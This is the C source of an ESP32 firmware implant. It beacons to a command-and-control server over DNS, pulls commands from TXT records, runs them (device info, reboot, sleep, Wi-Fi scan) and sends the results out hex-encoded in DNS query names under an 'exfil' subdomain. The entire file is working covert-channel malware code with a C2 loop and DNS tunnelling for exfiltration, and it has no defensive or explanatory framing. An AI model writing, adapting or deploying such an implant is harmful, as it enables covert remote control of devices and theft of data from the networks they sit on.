/*  ESP32 DNS-based C2 Implant
 *
 *  This implant uses DNS queries to communicate with a command-and-control server.
 *  It beacons periodically, fetches commands, executes them, and exfiltrates data
 *  using DNS A and TXT records.
 *
*/

#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/event_groups.h"
#include "esp_system.h"
#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_log.h"
#include "esp_mac.h"
#include "esp_timer.h"
#include "esp_chip_info.h"
#include "nvs_flash.h"
#include "lwip/err.h"
#include "lwip/sys.h"
#include "lwip/sockets.h"
#include "lwip/dns.h"
#include "lwip/netdb.h"

// ===== CONFIGURATION =====
#define WIFI_SSID       "SSID"
#define WIFI_PASS       "PASSWORD"
#define C2_SERVER_IP    "192.168.1.1"
#define C2_SERVER_PORT  5353
#define DOMAIN          "c2.local"
#define BEACON_INTERVAL_MS 5000  

static const char *TAG = "smokeless_flame";

// WiFi Event Group
static EventGroupHandle_t s_wifi_event_group;
#define WIFI_CONNECTED_BIT BIT0

// Implant ID
static char implant_id[32];
static uint32_t sequence_number = 0;


// ===== WIFI EVENT HANDLER =====
static void event_handler(void* arg, esp_event_base_t event_base,
                         int32_t event_id, void* event_data)
{
    if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_START) {
        esp_wifi_connect();
    } else if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_DISCONNECTED) {
        ESP_LOGI(TAG, "Disconnected, retrying...");
        esp_wifi_connect();
        xEventGroupClearBits(s_wifi_event_group, WIFI_CONNECTED_BIT);
    } else if (event_base == IP_EVENT && event_id == IP_EVENT_STA_GOT_IP) {
        ip_event_got_ip_t* event = (ip_event_got_ip_t*) event_data;
        ESP_LOGI(TAG, "Got IP:" IPSTR, IP2STR(&event->ip_info.ip));
        xEventGroupSetBits(s_wifi_event_group, WIFI_CONNECTED_BIT);
    }
}

// ===== WIFI INITIALIZATION =====
void wifi_init_sta(void)
{
    s_wifi_event_group = xEventGroupCreate();

    ESP_ERROR_CHECK(esp_netif_init());
    ESP_ERROR_CHECK(esp_event_loop_create_default());
    esp_netif_create_default_wifi_sta();

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));

    esp_event_handler_instance_t instance_any_id;
    esp_event_handler_instance_t instance_got_ip;
    ESP_ERROR_CHECK(esp_event_handler_instance_register(WIFI_EVENT,
                                                        ESP_EVENT_ANY_ID,
                                                        &event_handler,
                                                        NULL,
                                                        &instance_any_id));
    ESP_ERROR_CHECK(esp_event_handler_instance_register(IP_EVENT,
                                                        IP_EVENT_STA_GOT_IP,
                                                        &event_handler,
                                                        NULL,
                                                        &instance_got_ip));

    wifi_config_t wifi_config = {
        .sta = {
            .ssid = WIFI_SSID,
            .password = WIFI_PASS,
            .threshold.authmode = WIFI_AUTH_WPA2_PSK,
        },
    };
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_STA, &wifi_config));
    ESP_ERROR_CHECK(esp_wifi_start());

    ESP_LOGI(TAG, "wifi_init_sta finished.");

    // Wait for connection
    EventBits_t bits = xEventGroupWaitBits(s_wifi_event_group,
            WIFI_CONNECTED_BIT,
            pdFALSE,
            pdFALSE,
            portMAX_DELAY);

    if (bits & WIFI_CONNECTED_BIT) {
        ESP_LOGI(TAG, "Connected to AP SSID:%s", WIFI_SSID);
    }
}

// ===== DNS PACKET BUILDER =====
int build_dns_query(uint8_t* buffer, const char* domain, uint16_t qtype) {
    int pos = 0;
    
    // Transaction ID
    buffer[pos++] = 0x13;
    buffer[pos++] = 0x37;
    
    // Flags: Standard query, recursion desired
    buffer[pos++] = 0x01;
    buffer[pos++] = 0x00;
    
    // Questions: 1, Answers: 0, Authority: 0, Additional: 0
    buffer[pos++] = 0x00; buffer[pos++] = 0x01;
    buffer[pos++] = 0x00; buffer[pos++] = 0x00;
    buffer[pos++] = 0x00; buffer[pos++] = 0x00;
    buffer[pos++] = 0x00; buffer[pos++] = 0x00;
    
    // Encode domain name
    char domain_copy[256];
    strncpy(domain_copy, domain, 255);
    char* label = strtok(domain_copy, ".");
    
    while (label != NULL) {
        int label_len = strlen(label);
        buffer[pos++] = label_len;
        memcpy(&buffer[pos], label, label_len);
        pos += label_len;
        label = strtok(NULL, ".");
    }
    buffer[pos++] = 0; // Null terminator
    
    // QTYPE
    buffer[pos++] = (qtype >> 8) & 0xFF;
    buffer[pos++] = qtype & 0xFF;
    
    // QCLASS (IN = 1)
    buffer[pos++] = 0x00;
    buffer[pos++] = 0x01;
    
    return pos;
}

// ===== DNS RESPONSE PARSER =====
bool parse_a_record(uint8_t* response, int len, uint8_t* ip) {
    if (len < 12) return false;
    
    // Check answer count
    uint16_t an_count = (response[6] << 8) | response[7];
    if (an_count == 0) return false;
    
    // Simple parser - IP is in last 4 bytes
    if (len >= 4) {
        memcpy(ip, &response[len - 4], 4);
        return true;
    }
    
    return false;
}

int parse_txt_record(uint8_t* response, int len, char* txt, int max_len) {
    // Look for TXT data (length byte + data)
    for (int i = 12; i < len - 1; i++) {
        uint8_t txt_len = response[i];
        if (txt_len > 0 && txt_len < 255 && i + 1 + txt_len <= len) {
            int copy_len = (txt_len < max_len - 1) ? txt_len : max_len - 1;
            memcpy(txt, &response[i + 1], copy_len);
            txt[copy_len] = '\0';
            return copy_len;
        }
    }
    return 0;
}

// ===== DNS QUERY FUNCTION =====
bool send_dns_query(const char* domain, uint16_t qtype, uint8_t* response, int* response_len) {
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        ESP_LOGE(TAG, "Failed to create socket: errno %d", errno);
        return false;
    }
    
    // Set receive timeout
    struct timeval timeout;
    timeout.tv_sec = 2;
    timeout.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
    
    // Build query
    uint8_t query[512];
    int query_len = build_dns_query(query, domain, qtype);
    
    // Server address
    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(C2_SERVER_PORT);
    inet_pton(AF_INET, C2_SERVER_IP, &dest_addr.sin_addr);
    
    // Send query
    int err = sendto(sock, query, query_len, 0, 
                     (struct sockaddr *)&dest_addr, sizeof(dest_addr));
    if (err < 0) {
        ESP_LOGE(TAG, "Error sending query: errno %d", errno);
        close(sock);
        return false;
    }
    
    // Receive response
    struct sockaddr_in source_addr;
    socklen_t socklen = sizeof(source_addr);
    int len = recvfrom(sock, response, 512, 0, 
                      (struct sockaddr *)&source_addr, &socklen);
    
    close(sock);
    
    if (len > 0) {
        *response_len = len;
        return true;
    }
    
    return false;
}

// ===== C2 PROTOCOL FUNCTIONS =====
bool beacon(void) {
    ESP_LOGI(TAG, "Beaconing...");
    
    char domain[128];
    snprintf(domain, sizeof(domain), "%s.beacon.%s", implant_id, DOMAIN);
    
    uint8_t response[512];
    int response_len;
    
    if (send_dns_query(domain, 1, response, &response_len)) {
        uint8_t ip[4];
        if (parse_a_record(response, response_len, ip)) {
            ESP_LOGI(TAG, "Response IP: %d.%d.%d.%d", ip[0], ip[1], ip[2], ip[3]);
            // Check if commands available (1.2.3.5 = yes)
            return (ip[3] == 5);
        }
    }
    
    ESP_LOGW(TAG, "Beacon failed");
    return false;
}

bool fetch_command(char* cmd, int max_len) {
    ESP_LOGI(TAG, "Fetching command...");
    
    char domain[128];
    snprintf(domain, sizeof(domain), "cmd.%s.%s", implant_id, DOMAIN);
    
    uint8_t response[512];
    int response_len;
    
    if (send_dns_query(domain, 16, response, &response_len)) {
        char txt[256];
        if (parse_txt_record(response, response_len, txt, sizeof(txt)) > 0) {
            ESP_LOGI(TAG, "Received: %s", txt);
            
            if (strcmp(txt, "NONE") == 0) {
                return false;
            }
            
            strncpy(cmd, txt, max_len - 1);
            cmd[max_len - 1] = '\0';
            return true;
        }
    }
    
    ESP_LOGW(TAG, "Fetch failed");
    return false;
}

void exfiltrate_data(const char* data) {
    int data_len = strlen(data);
    ESP_LOGI(TAG, "Exfiltrating %d bytes", data_len);
    
    // Chunk data (40 chars per chunk, hex encoded)
    int chunk_size = 20; // 20 bytes = 40 hex chars
    int total_chunks = (data_len + chunk_size - 1) / chunk_size;
    
    for (int i = 0; i < total_chunks; i++) {
        int start = i * chunk_size;
        int end = (start + chunk_size < data_len) ? start + chunk_size : data_len;
        
        // Hex encode chunk
        char hex_chunk[128];
        int hex_pos = 0;
        for (int j = start; j < end && hex_pos < 126; j++) {
            hex_pos += snprintf(&hex_chunk[hex_pos], 3, "%02X", (uint8_t)data[j]);
        }
        hex_chunk[hex_pos] = '\0';
        
        char domain[256];
        snprintf(domain, sizeof(domain), "%s.%lu.%s.exfil.%s", 
                 hex_chunk, sequence_number++, implant_id, DOMAIN);
        
        ESP_LOGI(TAG, "Sending chunk %d/%d", i + 1, total_chunks);
        
        uint8_t response[512];
        int response_len;
        send_dns_query(domain, 1, response, &response_len);
        
        vTaskDelay(500 / portTICK_PERIOD_MS); // Rate limiting
    }
}

// ===== COMMAND EXECUTION =====
void execute_command(const char* cmd, char* output, int max_len) {
    ESP_LOGI(TAG, "Executing: %s", cmd);
    
    if (strncmp(cmd, "info", 4) == 0) {
        esp_chip_info_t chip_info;
        esp_chip_info(&chip_info);
        
        snprintf(output, max_len, 
                "ESP32 Implant\n"
                "ID: %s\n"
                "Chip: %d cores, WiFi%s%s\n"
                "Free heap: %ld bytes\n"
                "Uptime: %lld sec",
                implant_id,
                chip_info.cores,
                (chip_info.features & CHIP_FEATURE_BT) ? "/BT" : "",
                (chip_info.features & CHIP_FEATURE_BLE) ? "/BLE" : "",
                esp_get_free_heap_size(),
                esp_timer_get_time() / 1000000
            );
    }
    else if (strncmp(cmd, "reboot", 6) == 0) {
        snprintf(output, max_len, "Rebooting...");
        vTaskDelay(1000 / portTICK_PERIOD_MS);
        esp_restart();
    }
    else if (strncmp(cmd, "sleep ", 6) == 0) {
        int seconds = atoi(cmd + 6);
        ESP_LOGI(TAG, "Sleeping for %d seconds", seconds);
        vTaskDelay((seconds * 1000) / portTICK_PERIOD_MS);
        snprintf(output, max_len, "Awake after %d seconds", seconds);
    }
    else if (strncmp(cmd, "scan", 4) == 0) {
        ESP_LOGI(TAG, "Scanning WiFi...");
        
        wifi_scan_config_t scan_config = {
            .ssid = NULL,
            .bssid = NULL,
            .channel = 0,
            .show_hidden = false
        };
        
        esp_wifi_scan_start(&scan_config, true);
        
        uint16_t ap_count = 0;
        esp_wifi_scan_get_ap_num(&ap_count);
        
        wifi_ap_record_t ap_info[10];
        uint16_t number = 10;
        esp_wifi_scan_get_ap_records(&number, ap_info);
        
        int pos = snprintf(output, max_len, "WiFi Networks:\n");
        for (int i = 0; i < number && pos < max_len - 50; i++) {
            pos += snprintf(output + pos, max_len - pos, 
                          "%s (%d dBm)\n", 
                          ap_info[i].ssid, ap_info[i].rssi);
        }
    }
    else {
        snprintf(output, max_len, "Unknown command");
    }
}

// ===== MAIN C2 TASK =====
void c2_task(void *pvParameters) {
    while (1) {
        ESP_LOGI(TAG, "=== Beacon Cycle ===");
        
        if (beacon()) {
            ESP_LOGI(TAG, "Commands available!");
            
            char cmd[256];
            if (fetch_command(cmd, sizeof(cmd))) {
                ESP_LOGI(TAG, "Command: %s", cmd);
                
                char output[512];
                execute_command(cmd, output, sizeof(output));
                ESP_LOGI(TAG, "Output:\n%s", output);
                
                exfiltrate_data(output);
            }
        } else {
            ESP_LOGI(TAG, "No commands pending");
        }
        
        ESP_LOGI(TAG, "Sleeping for %d seconds...", BEACON_INTERVAL_MS / 1000);
        vTaskDelay(BEACON_INTERVAL_MS / portTICK_PERIOD_MS);
    } 
}

// ===== APP MAIN =====
void app_main(void)
{
    // Initialize NVS
    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }
    ESP_ERROR_CHECK(ret);
    
    ESP_LOGI(TAG, "=== ESP32 DNS C2 Implant ===");
    
    // Generate unique implant ID from MAC
    uint8_t mac[6];
    esp_read_mac(mac, ESP_MAC_WIFI_STA);
    snprintf(implant_id, sizeof(implant_id), "esp32_%02X%02X%02X%02X%02X%02X",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    
    ESP_LOGI(TAG, "Implant ID: %s", implant_id);
    ESP_LOGI(TAG, "C2 Server: %s:%d", C2_SERVER_IP, C2_SERVER_PORT);
    
    // Initialize WiFi
    wifi_init_sta();
    
    ESP_LOGI(TAG, "Implant ready!");
    
    // Start C2 task
    xTaskCreate(c2_task, "c2_task", 8192, NULL, 5, NULL);
}